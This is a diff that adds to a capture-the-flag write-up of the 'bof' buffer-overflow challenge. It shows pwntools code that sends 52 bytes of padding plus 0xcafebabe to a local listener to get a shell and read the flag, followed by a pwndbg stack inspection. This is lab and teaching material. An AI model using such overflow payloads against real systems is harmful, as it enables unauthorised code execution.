@@ -14,6 +14,16 @@ bof@ubuntu:~$ file ./bof
 ./bof: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1cabd158f67491e9edb3df0219ac3a4ef165dc76, for GNU/Linux 3.2.0, not stripped
 ```
 
+There is a readme as well, let's check it out.
+
+```
+bof@ubuntu:~$ cat readme
+bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read flag
+```
+
+Ok, so we have to exploit the challenge is running at `nc 0 9000`, not locally.
+[I definitely did not waste a lot of time doing the latter.](https://en.wikipedia.org/wiki/Sarcasm)
+
 We can see that it is a little-endian 32-bit ELF executable.
 
 ```c title="bof.c"
@@ -200,28 +210,57 @@ We have all the information we need to create an exploit.
 	- [x] Value of `key` to overwrite: `0xcafebabe`
 	- [x] Distance between the buffer and `key`: `52`
 
+Let's craft our exploit and send it to the listener.
 
 ```python
 bof@ubuntu:~$ python
 Python 3.10.12 (main, Feb  4 2025, 14:57:36) [GCC 11.4.0] on linux
 Type "help", "copyright", "credits" or "license" for more information.
 >>> from pwn import *
->>> payload = b"A" * 52
->>> payload += p32(0xcafebabe)
->>> print(payload)
-b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca'
+>>> padding = b"A" * 52
+>>> key = p32(0xcafebabe)
+>>> payload = padding + key
+>>> io = remote('0',9000)
+[x] Opening connection to 0 on port 9000
+[x] Opening connection to 0 on port 9000: Trying 0.0.0.0
+[+] Opening connection to 0 on port 9000: Done
+>>> io.sendline(payload)
+>>> io.interactive()
+[*] Switching to interactive mode
+```
+
+Now that we have a shell, we can get the flag.
+
+```
+[*] Switching to interactive mode
+id
+uid=1008(bof_pwn) gid=1008(bof_pwn) groups=1008(bof_pwn)
+cat ./flag
+Daddy_I_just_pwned_a_buff3r!
+```
+
+#### Stuff I was trying unnecessarily
+
+> I am leaving this here, as a reminder to myself and as a note to others.
+
+```
+>>> from pwn import *
+>>> padding = b"A" * 52
+>>> key = p32(0xcafebabe)
+>>> payload = padding + key
+>>> io = remote('0', 9000)
 ```
 
 ```
 bof@ubuntu:~$ ./bof
-overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca
+overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xBE\xBA\xFE\xCA
 
 Nah..
 *** stack smashing detected ***: terminated
 Aborted (core dumped)
 ```
 
-It seems like there is a stack canary,
+It seems like there is a stack canary, let's verify using `checksec`.
 
 ```
 bof@ubuntu:~$ checksec ./bof
@@ -233,4 +272,93 @@ bof@ubuntu:~$ checksec ./bof
     NX:         NX enabled
     PIE:        PIE enabled
     Stripped:   No
+```
+
+We can see what the canary value is using GDB.
+Let's set a breakpoint right after `gets()` reads our input.
+
+```
+pwndbg> break *(func+60)
+Breakpoint 1 at 0x1239
+```
+
+Now, we can run the program again and provide our cyclic pattern.
+
+```
+pwndbg> run
+Starting program: /home/bof/bof
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+overflow me : aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+
+Breakpoint 1, 0x56556239 in func ()
+Disabling the emulation via Unicorn Engine that is used for computing branches as there isn't enough memory (1GB) to use it (since mmap(1G, RWX) failed). See also:
+* https://github.com/pwndbg/pwndbg/issues/1534
+* https://github.com/unicorn-engine/unicorn/pull/1743
+Either free your memory or explicitly set `set emulate off` in your Pwndbg config
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────
+ EAX  0xffffd4bc ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+ EBX  0x56559000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3efc
+ ECX  0xf7fa89c0 (_IO_stdfile_0_lock) ◂— 0
+ EDX  1
+ EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
+ ESI  0xffffd5d4 —▸ 0xffffd72c ◂— '/home/bof/bof'
+ EBP  0xffffd4e8 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+ ESP  0xffffd4a0 —▸ 0xffffd4bc ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+ EIP  0x56556239 (func+60) ◂— add esp, 0x10
+────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate off ]─────────────────────────────────────────────────────────────────────────────────────
+ ► 0x56556239 <func+60>    add    esp, 0x10                           ESP => 0xffffd4a0 + 0x10
+   0x5655623c <func+63>    cmp    dword ptr [ebp + 8], 0xcafebabe
+   0x56556243 <func+70>    jne    func+117                    <func+117>
+
+   0x56556245 <func+72>    call   getegid@plt                 <getegid@plt>
+
+   0x5655624a <func+77>    mov    esi, eax
+   0x5655624c <func+79>    call   getegid@plt                 <getegid@plt>
+
+   0x56556251 <func+84>    sub    esp, 8
+   0x56556254 <func+87>    push   esi
+   0x56556255 <func+88>    push   eax
+   0x56556256 <func+89>    call   setregid@plt                <setregid@plt>
+
+   0x5655625b <func+94>    add    esp, 0x10
+─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ esp 0xffffd4a0 —▸ 0xffffd4bc ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+01:0004│-044 0xffffd4a4 ◂— 0xffffffff
+02:0008│-040 0xffffd4a8 —▸ 0x56555034 ◂— 6
+03:000c│-03c 0xffffd4ac —▸ 0x5655620a (func+13) ◂— add ebx, 0x2df6
+04:0010│-038 0xffffd4b0 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f
+05:0014│-034 0xffffd4b4 ◂— 0x20 /* ' ' */
+06:0018│-030 0xffffd4b8 ◂— 0
+07:001c│ eax 0xffffd4bc ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0 0x56556239 func+60
+   1 0x6161616d None
+   2 0x6161616e None
+   3 0x6161616f None
+   4 0x61616170 None
+   5 0x61616171 None
+   6 0x61616172 None
+   7 0x61616173 None
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> x/50xw $esp
+0xffffd4a0:	0xffffd4bc	0xffffffff	0x56555034	0x5655620a
+0xffffd4b0:	0xf7ffd608	0x00000020	0x00000000	0x61616161
+0xffffd4c0:	0x61616162	0x61616163	0x61616164	0x61616165
+0xffffd4d0:	0x61616166	0x61616167	0x61616168	0x61616169
+0xffffd4e0:	0x6161616a	0x6161616b	0x6161616c	0x6161616d
+0xffffd4f0:	0x6161616e	0x6161616f	0x61616170	0x61616171
+0xffffd500:	0x61616172	0x61616173	0x61616174	0x61616175
+0xffffd510:	0x61616176	0x61616177	0x61616178	0x61616179
+0xffffd520:	0x00000000	0xffffd5d4	0xffffd5dc	0xffffd540
+0xffffd530:	0xf7fa7000	0x5655629d	0x00000001	0xffffd5d4
+0xffffd540:	0xf7fa7000	0xffffd5d4	0xf7ffcb80	0xf7ffd020
+0xffffd550:	0xf96c6d31	0xb50f8721	0x00000000	0x00000000
+0xffffd560:	0x00000000	0xf7ffcb80
+```
+
+```
+pwndbg> break *(func+55)
+Breakpoint 1 at 0x1234
 ```
